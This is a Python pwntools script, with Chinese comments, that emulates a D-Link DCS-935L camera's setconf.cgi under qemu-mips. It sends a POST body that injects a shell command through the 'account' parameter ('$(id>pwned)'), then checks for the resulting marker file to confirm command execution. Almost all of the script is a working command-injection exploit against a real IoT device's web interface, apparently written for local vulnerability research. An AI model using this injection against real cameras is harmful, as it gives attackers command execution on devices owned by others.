#!/usr/bin/env python3
# 在 WSL 里跑：python3 exploit_setconf.py
import socket, os
from pwn import *

context(os='linux', arch='mips', log_level='debug')
ROOTFS = "/home/roit/IOT/D-Link_DCS-935L/_DCS-935L_A1_FW_1.10.01.rar.extracted/squashfs-root"
CGI    = "./web/cgi-bin/localrecording/setconf.cgi"

# POST body（urlencoded）。$(id>pwned) 用相对路径：
# qemu 运行时 open 不翻译绝对路径，相对路径才基于 host cwd(=rootfs) 落到固件内
body = b'account=$(id>pwned)&password=x&UID=1&overwrite=1&no=1'

env = {
    "REQUEST_METHOD":  "POST",
    "CONTENT_LENGTH":  str(len(body)),
    "CONTENT_TYPE":    "application/x-www-form-urlencoded",
    "REQUEST_URI":     "/cgi-bin/localrecording/setconf.cgi",
    "SCRIPT_NAME":     "/cgi-bin/localrecording/setconf.cgi",
    "QUERY_STRING":    "",
    "REMOTE_ADDR":     "127.0.0.1",
    "HTTP_HOST":       "127.0.0.1",
    "HTTP_COOKIE":     "",
}

# 关键差异 vs hedwig.cgi：
#   hedwig.cgi 从 env(HTTP_COOKIE) 读数据 -> pipe stdin 够用；
#   setconf.cgi 的 cgiInit 用 recv(0) 读 body -> stdin 必须是 socket，
#   所以用 socketpair 当 guest 的 fd0（pipe/tty 会 ENOTSOCK -> 返回 500）。
sparent, schild = socket.socketpair()

io = process(
    ["qemu-mips-static", "-strace", "-L", ROOTFS, CGI],
    env=env,
    cwd=ROOTFS,
    stdin=schild.fileno(),   # guest fd0 = socket
    stdout=PIPE,
    stderr=STDOUT,          # strace 合并进 stdout，一次 recvall 全拿到
)
schild.close()                      # 父进程关掉 guest 侧端点
sparent.send(body)                  # 写入 body
sparent.shutdown(socket.SHUT_WR)    # EOF：recv 读完返回 0，不会挂起

out = io.recvall(timeout=15)
print(out.decode('latin1'))

# 验证：payload 用相对路径，落地到固件 rootfs/pwned
marker = os.path.join(ROOTFS, "pwned")
if os.path.exists(marker):
    print("\n[+] 命令执行成功，固件 squashfs-root/pwned 内容：")
    print(open(marker, "rb").read().decode('latin1'))
else:
    print("\n[-] 固件 rootfs/pwned 未落地，未触发命令执行")
